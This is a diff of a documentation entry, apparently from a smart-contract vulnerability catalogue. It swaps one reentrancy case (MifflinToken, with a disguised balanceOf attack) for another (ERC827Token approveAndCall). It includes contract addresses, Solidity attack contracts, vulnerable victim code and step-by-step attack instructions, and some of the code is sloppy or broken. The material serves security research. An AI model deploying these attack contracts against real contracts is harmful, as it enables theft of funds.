@@ -4,54 +4,50 @@ Attack 05
 
 **Contract Name**
 
-MifflinToken
+EDUToken
 
 **Contract Address**
 
-0x1ff6f142ebdce220d8dd85eb31dcb92a47690846
+0x2f55045439c0361ac971686e06d5b698952f89c1
 
 **Transaction Count**
 
-1
+5
 
 **Invovled Ethers**
 
-0.1 Ethers
+0.85 Ethers
 
 **Length of the Call Chain**
 
-2 external function, 2 internal funciton
+1 external function
 
 **Victim Function**
 
-``CashOut``
+``approveAndCall``
 
 **Attack Mechanisim**
 
 Attack code:
 ::
 
-    contract Attack is MifflinToken {
-        address victim;
-        address market;
+    contract Attack{
+        ERC827Token e = new ERC827Token();
+        bytes  bs4 = new bytes(4);
+        bytes4 functionSignature = bytes4(keccak256("attack()"));
         constructor() payable {}
 
-        function setVictim(address _vic, address _market) {
-            victim = _vic
-            market = _market
+        function prepareWork() {
+            for (uint i = 0; i< bs4.length; i++){
+                bs4[i] = functionSignature[i];
+            }
         }
 
-        function prepareAttack() {
-            market.call(bytes4(keccak256("setToken(uint8, address)")), 1, this);
+        function attack() public {
+            e.approveAndCall.value(0)(this, 1 eth, bs4);
         }
 
-        function balanceOf(MifflinToken token) public {   // Disguised attack function
-            victim.call.value(1 eth)(bytes4(keccak256("contribution(uint256)")), 10);
-        }
-
-        function() payable{
-            p.CashOut(1 eth);
-        }
+        function() payable{}
 
         function getvalue() returns (uint) {
             return this.balance;
@@ -61,62 +57,21 @@ Attack code:
 Attacked code:
 ::
 
-    contract MifflinToken is Owned, TokenERC20 {
-        ...
-        function contribution(uint256 amount)internal returns(int highlow){
-            owner.transfer(msg.value);
-            totalContribution += msg.value;
+    contract ERC827Token is ERC827, StandardToken {
+        function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
+            require(_spender != address(this));
 
-            if (amount > highestContribution) {
-                uint256 oneper = buyPrice * 99 / 100; // lower by 1%*
-                uint256 fullper = buyPrice *  highestContribution / amount; // lower by how much you beat the prior contribution
-                if(fullper > oneper) buyPrice = fullper;
-                else buyPrice = oneper;
-                highestContribution = amount;
-                // give reward
-                MifflinMarket(exchange).highContributionAward(msg.sender);
-                return 1;
-            } else if(amount < lowestContribution){
-                MifflinMarket(exchange).lowContributionAward(msg.sender);
-                lowestContribution = amount;
-                return -1;
-            } else return 0;
+            super.approve(_spender, _value);
+        
+            require(_spender.call.value(msg.value)(_data));
+
+            return true;
         }
-
-        ...
-    }
-
-    contract MifflinMarket is Owned {
-        ...
-        modifier onlyOwnerOrigin{
-            require(tx.origin == owner);
-            _;
-        }
-
-        function setToken(uint8 tid,address addy) public onlyOwnerOrigin { // Only add tokens that were created by exchange owner
-            tokenIds[tid] = addy;
-        }
-
-        function getRewardToken() public view returns(MifflinToken){
-            return getTokenById(rewardTokenId);
-        }
-
-        function getTokenById(uint8 id) public view returns(MifflinToken){
-            require(tokenIds[id] > 0);
-            return MifflinToken(tokenIds[id]);
-        }
-
-        function highContributionAward(address to) public onlyTokens {
-            MifflinToken reward = getRewardToken();
-            //dont throw an error if there are no more tokens
-            if(reward.balanceOf(reward) > 0){
-                reward.give(to, 1);
-            }
-        }
-        ...
-    }
     ...
+    }
 
-In this case, the key condition defenses reentrancy attack is ``reward.balanceOf(reward) > 0`` in function ``highContributionAward``. However, ``reward`` can be easily tainted. It inherits value from ``tokenIds[id]``, which can also be easily taited by any access.
+In this case, the goal of our reentrancy is ``require(_spender.call.value(msg.value)(_data));``. To reach it, we need to make sure the address variable *_spender* does not equals to the address of ``ERC827Token``. And this can be done easily by setting an arbitrary hex string. Additionally, the ``_data`` parameter ensures we can recursively call our attack function.
 
-**Attack.** The attacker call ``setVictim`` function to specify the address to attack. Then attacker call ``prepareAttack``function to taint variable. Finally attacker call ``balanceOf`` to start attack.
+**Preparation.** We set attack function's signature by calling ``prepareWork()`` function in attack code. 
+
+**Attack.** The attacker call ``attack()`` function, it calls ``approveAndCall`` function with the parameters setted by attacker in victim contract. The ``require`` condition is satisfied because the first parameter is attacker's address. Next it goes to the key statement ``require(_spender.call.value(msg.value)(_data));`` which calls back to the ``attack()`` function in attacker's contract. Hence, a call loop is formed and we achieved a *Reentrancy* attack.
